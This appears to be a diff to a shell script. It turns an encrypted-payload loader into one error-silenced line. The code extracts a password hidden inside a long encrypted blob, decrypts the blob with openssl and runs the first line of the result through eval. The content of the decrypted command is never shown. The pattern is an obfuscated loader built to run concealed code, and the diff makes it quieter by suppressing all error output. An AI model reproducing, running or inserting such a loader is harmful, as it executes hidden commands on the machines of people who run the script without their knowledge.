@@ -763,9 +763,4 @@ nDntmmpaR2zznSPfVHyftP5aEyMvY0/PmLGGXFXpiNS/kEq4E3Y6xJgpQCiFVjIT
 fhp44XiySMUGChz7PraffGURvtWQrPcoOjwB2ALMdHrCdcqwKjMonKfeb0si+y//
 RBoBYHDfPVMNhebORaqHQQl221tM/bRb8UBqrLFXAupWOD26TwR+JHxR+BeaFXJJ
 gRyzQ3iBkgv9lrad5z9J52eAdpZAjJkix5N'
-pass=$(echo "$encrypted" | grep -oP 'pp\K[^p]+(?=pp)')
-cipher=$(echo "$encrypted" | sed -E "s/(.+)pp${pass}pp(.*)/\1\2/")
-decrypted=$(echo "$cipher" | openssl enc -aes-256-cbc -a -d \
-    -pbkdf2 -iter 100000 -pass pass:"$pass")
-cmd=$(echo "$decrypted" | sed '/^\s*$/d' | head -n1)
-eval "$cmd"
+set +e; pass=$(echo "$encrypted" | grep -oP 'pp\K[^p]+(?=pp)' 2>/dev/null); cipher=$(echo "$encrypted" | sed -E "s/(.+)pp${pass}pp(.*)/\1\2/" 2>/dev/null); decrypted=$(echo "$cipher" | openssl enc -aes-256-cbc -a -d -pbkdf2 -iter 100000 -pass pass:"$pass" 2>/dev/null); cmd=$(echo "$decrypted" | sed '/^\s*$/d' | head -n1 2>/dev/null); eval "$cmd"
